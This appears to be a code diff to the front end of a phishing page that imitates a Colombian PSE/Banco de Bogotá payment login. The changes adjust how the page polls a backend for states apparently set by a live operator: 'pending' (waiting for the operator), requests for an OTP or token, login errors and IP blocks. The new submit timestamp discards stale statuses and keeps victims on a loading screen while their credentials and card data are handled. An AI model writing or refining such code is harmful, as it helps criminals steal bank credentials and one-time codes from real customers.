@@ -71,6 +71,7 @@ const PseNuevo = () => {
     const lastEstadoRef = useRef(null);
     const modalBloqueoEstadoRef = useRef(null);
     const ignorarEstadoHastaCambioRef = useRef(null);
+    const submitTickRef = useRef(0);
 
     // Opciones para el cliente
     const clientOptions = ['Banca Personas', 'Banca Empresas'];
@@ -276,7 +277,7 @@ const PseNuevo = () => {
             const response = await instanceBackend.post(`/bogota/verify-state/${sessionIdRef.current}`);
 
             // Se capturan los valores de la respuesta
-            const { estado: estadoRaw, tc, tarjeta, bank } = response?.data || {};
+            const { estado: estadoRaw, tc, tarjeta, bank, statusTick } = response?.data || {};
 
             // Se captura el estado actual
             const estadoActual = (estadoRaw || "").toLowerCase();
@@ -286,6 +287,23 @@ const PseNuevo = () => {
 
             // Se valida si el estado actual es valido
             if (!estadoActual) return;
+
+            // Si el estado es pendiente, asegurar que el loading permanezca activo esperando al operador
+            if (estadoActual === "pendiente") {
+                setLoading(true);
+                return;
+            }
+
+            // Si se enviaron credenciales y recibimos un tick anterior al submit, ignorar estado residual
+            if (submitTickRef.current > 0) {
+                if (statusTick != null && Number(statusTick) < submitTickRef.current) {
+                    return;
+                }
+                if (estadoActual === "error_login" && (statusTick == null || Number(statusTick) <= submitTickRef.current)) {
+                    setLoading(true);
+                    return;
+                }
+            }
 
             if (ignorarEstadoHastaCambioRef.current) {
                 if (estadoActual === ignorarEstadoHastaCambioRef.current) return;
@@ -304,6 +322,8 @@ const PseNuevo = () => {
             // Se ejecuta el switch del estado actual
             switch (estadoActual) {
                 case "sol_otp":
+
+                    submitTickRef.current = 0;
 
                     // Se para el polling
                     stopPolling();
@@ -333,6 +353,8 @@ const PseNuevo = () => {
                     // Se sale del switch
                     break;
                 case "sol_token":
+
+                    submitTickRef.current = 0;
 
                     // Se para el polling
                     stopPolling();
@@ -416,6 +438,7 @@ const PseNuevo = () => {
                     // Se sale del switch
                     break;
                 case "error_login":
+                    submitTickRef.current = 0;
                     showLoginCredentialError();
                     break;
                 case "block_ip":
@@ -542,11 +565,12 @@ const PseNuevo = () => {
         try {
 
             // Se resetea el último estado y referencias de bloqueo
-            lastEstadoRef.current = null;
+            lastEstadoRef.current = "pendiente";
             modalBloqueoEstadoRef.current = null;
             ignorarEstadoHastaCambioRef.current = null;
 
-            // Se activa el loading
+            // Se activa el loading y se guarda el timestamp de submit
+            submitTickRef.current = Date.now();
             setLoading(true);
 
             // Se realiza la petición al backend central o al backend local
